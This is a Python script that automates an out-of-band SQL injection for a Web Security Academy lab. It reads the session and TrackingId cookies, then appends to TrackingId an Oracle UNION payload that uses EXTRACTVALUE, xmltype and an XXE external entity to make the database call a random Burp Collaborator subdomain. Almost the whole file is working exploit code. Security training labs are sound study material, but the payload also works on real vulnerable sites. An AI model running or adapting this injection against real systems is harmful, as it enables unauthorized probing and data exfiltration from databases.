import requests
from urllib.parse import quote, urlparse
import uuid # For generating random strings

def get_initial_cookies(lab_url):
    """
    Accesses the specified URL to retrieve session and TrackingId cookies.
    """
    print(f"\n[INFO] Accessing {lab_url} to retrieve initial cookies...")
    try:
        response = requests.get(lab_url, timeout=10, allow_redirects=True)
        response.raise_for_status() # Raise an exception for bad status codes
        
        session_cookie_value = response.cookies.get('session')
        original_tracking_id = response.cookies.get('TrackingId')

        if not session_cookie_value:
            print("[WARN] Session cookie could not be retrieved automatically. Manual configuration might be needed.")
        else:
            print(f"[SUCCESS] Session cookie retrieved: {session_cookie_value}")

        if not original_tracking_id:
            print("[WARN] TrackingId cookie could not be retrieved automatically. Manual configuration for the payload base might be needed, or the lab behavior might differ.")
            # As a fallback, could prompt the user for manual input or use a fixed value.
            # Here, we return None if not found.
        else:
            print(f"[SUCCESS] TrackingId cookie retrieved: {original_tracking_id}")
            
        return session_cookie_value, original_tracking_id
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] An error occurred while retrieving initial cookies: {e}")
        return None, None

# --- Payload construction and request sending ---
def attempt_oob_sqli(lab_url, session_cookie_value, original_tracking_id_from_initial_request):
    """
    Sends a request attempting OOB SQLi with the specified payload.
    """
    # Use the provided original_tracking_id if available, otherwise fallback.
    # This specific lab usually provides a TrackingId which is then manipulated.
    # If it wasn't automatically fetched, we might need a default or user input.
    if not original_tracking_id_from_initial_request:
        # As a fallback, using the previously discussed fixed value.
        # This might need adjustment based on the specific lab instance if auto-retrieval fails.
        original_tracking_id = "8wsMQYl7WpBG4EP6" 
        print(f"[INFO] TrackingId was not automatically retrieved. Using default value: '{original_tracking_id}'.")
        print("       If a different base TrackingId is required, please modify the script.")
    else:
        original_tracking_id = original_tracking_id_from_initial_request

    # Generate a random Burp Collaborator subdomain
    random_string = uuid.uuid4().hex[:12] # 12-character random hex string
    collaborator_subdomain = f"{random_string}.burpcollaborator.net"
    print(f"[INFO] Generated Collaborator subdomain: {collaborator_subdomain}")

    # Oracle database OOB SQLi payload using XXE
    # XML payload template; inserts the Collaborator subdomain
    xml_payload_template = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{collaborator_subdomain}/"> %remote;]>'

    # URL-encode the XML payload
    encoded_xml_payload = quote(xml_payload_template)

    # Core part of the SQL injection payload
    # Uses EXTRACTVALUE and xmltype to parse XML and attempt external entity resolution,
    # which is expected to trigger an HTTP request (and thus a DNS lookup) to the specified COLLABORATOR_SUBDOMAIN.
    sql_injection_core = f"'+UNION+SELECT+EXTRACTVALUE(xmltype('{encoded_xml_payload}'),'/l')+FROM+dual--"

    # Final TrackingId value
    malicious_tracking_id = original_tracking_id + sql_injection_core

    # Format the target URL (target the main page)
    # Add a trailing slash if not present
    target_url = lab_url if lab_url.endswith('/') else lab_url + '/'

    headers = {
        "Cookie": f"TrackingId={malicious_tracking_id}; session={session_cookie_value}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36", # Common User-Agent
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }

    print(f"\n[INFO] Target URL: {target_url}")
    print(f"[INFO] Sending TrackingId payload (partial): ...{sql_injection_core[:50]}...") # Displaying a part as it's too long
    # print(f"Full TrackingId being sent: {malicious_tracking_id}") # Uncomment for debugging if needed
    print("-" * 30)

    try:
        response = requests.get(target_url, headers=headers, timeout=20) # Increased timeout
        print("[INFO] Request sent.")
        print(f"[INFO] Status Code: {response.status_code}")
        # For blind SQLi, success cannot be determined from the response content
        print("-" * 30)
        print("IMPORTANT: This script cannot confirm if the DNS lookup actually occurred (i.e., if the attack was successful).")
        print("Please check the Web Security Academy page to see if the lab is solved.")
        print(f"If successful, the database should have attempted a DNS lookup to {collaborator_subdomain}.")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] An error occurred during the OOB SQLi request: {e}")

if __name__ == "__main__":
    print("--- Out-of-Band SQLi Attempt Script (Automation Improved - English) ---")
    lab_url_input = input("Enter the Lab URL (e.g., https://YOUR-LAB-ID.web-security-academy.net/): ").strip()

    if not lab_url_input.startswith("http://") and not lab_url_input.startswith("https://"):
        print("[ERROR] The URL must start with http:// or https://.")
    else:
        # Validate and format the URL (trailing slash is optional for input)
        parsed_url = urlparse(lab_url_input)
        if not parsed_url.scheme or not parsed_url.netloc:
            print("[ERROR] Invalid URL format.")
        else:
            # Attempt to retrieve initial cookies
            session_val, tracking_id_val = get_initial_cookies(lab_url_input)

            if session_val: # Only attempt the attack if the session cookie was retrieved
                attempt_oob_sqli(lab_url_input, session_val, tracking_id_val)
            else:
                print("\n[INFO] Could not retrieve the session cookie, so the attack request was not sent.")
                print("       Please verify that the lab URL is correct or if session information needs to be set manually.")
